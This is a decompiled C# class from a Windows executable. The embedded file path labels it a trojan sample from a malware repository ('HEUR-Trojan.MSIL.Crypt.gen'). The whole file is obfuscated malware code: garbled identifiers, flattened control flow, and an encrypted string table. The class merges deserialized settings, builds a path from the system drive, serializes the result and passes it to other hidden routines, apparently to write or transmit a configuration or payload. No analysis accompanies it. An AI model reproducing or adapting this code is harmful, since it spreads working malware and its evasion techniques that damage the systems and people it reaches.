// Decompiled with JetBrains decompiler
// Type: @ӫ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;

internal sealed class \u0040ӫ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string \u003687() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int \u0034Vu() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040ӫ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    \u0040ӫ.\u0040Ӡ();
    int num1 = \u0040ӫ.\u0040ӡ() ? 2 : 3;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 3:
          goto label_4;
        case 1:
        case 2:
          goto label_1;
        case 4:
          goto label_5;
        default:
          if (true)
          {
            num1 = 4;
            continue;
          }
          goto label_4;
      }
    }
label_1:
    \u0040ӫ.\u0040Ӗ((object) this);
    goto label_5;
label_4:
    \u0040ӫ.\u0040ӕ();
    goto label_1;
label_5:
    try
    {
      Dictionary<string, string> dictionary1 = _param2.\u0040ӗ<Dictionary<string, string>>();
      Dictionary<string, object> dictionary2 = _param2.\u0040ӗ<Dictionary<string, object>>();
      Dictionary<string, object> dictionary3 = new Dictionary<string, object>();
      foreach (KeyValuePair<string, object> keyValuePair in dictionary2)
      {
        int num2 = 3;
        while (true)
        {
          bool flag;
          switch (num2)
          {
            case 0:
            case 1:
              if (!flag)
              {
                dictionary3[keyValuePair.Key] = dictionary2[keyValuePair.Key];
                num2 = 6;
                continue;
              }
              break;
            case 3:
              flag = keyValuePair.Value is string;
              num2 = \u0040ӫ.\u0040ӡ() ? 4 : 0;
              continue;
            case 5:
            case 6:
              goto label_14;
          }
          dictionary3[keyValuePair.Key] = (object) dictionary1[keyValuePair.Key];
          num2 = 5;
        }
label_14:;
      }
      string str1 = (string) dictionary3[(string) \u0040ӫ.\u0040ӗ(2330)];
      if (\u0040ӫ.\u0040Ә((object) str1) < 2)
        str1 = (string) \u0040ӫ.\u0040Ӝ(\u0040ӫ.\u0040ӛ(\u0040ӫ.\u0040Ӛ(\u0040ӫ.\u0040ә()), \u0040ӫ.\u0040ӗ(2354)), \u0040ӫ.\u0040ӗ(2372), \u0040ӫ.\u0040ӗ(1604));
      dictionary3[(string) \u0040ӫ.\u0040ӗ(2330)] = (object) str1;
      byte[] numArray = new \u0040Ԙ().\u0040Ӗ(dictionary3, false, _param3);
      string str2 = (string) \u0040ӫ.\u0040ӗ(2380);
      string str3 = (string) \u0040ӫ.\u0040ӗ(2416);
      \u0040ԝ.\u0040ؑ(_param3, str2, str3);
      \u0040ԝ.\u0040ۮ(numArray, (string) \u0040ӫ.\u0040ӗ(2422), _param3);
      \u0040ӫ.\u0040ӝ();
      \u0040ӫ.\u0040Ӟ(2000);
      this.\u0040Ӕ = 0;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040ӫ.\u0040ӟ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӗ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040Ә(object _param0) => ((string) _param0).Length;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ә() => (object) Environment.SystemDirectory;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӛ(object _param0) => (object) Path.GetPathRoot((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӛ(object _param0, object _param1) => (object) ((string) _param0 + (string) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӝ(object _param0, object _param1, object _param2) => (object) ((string) _param0).Replace((string) _param1, (string) _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӝ() => GC.Collect();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӟ(int _param0) => Thread.Sleep(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӟ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӡ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӡ() => false;
}
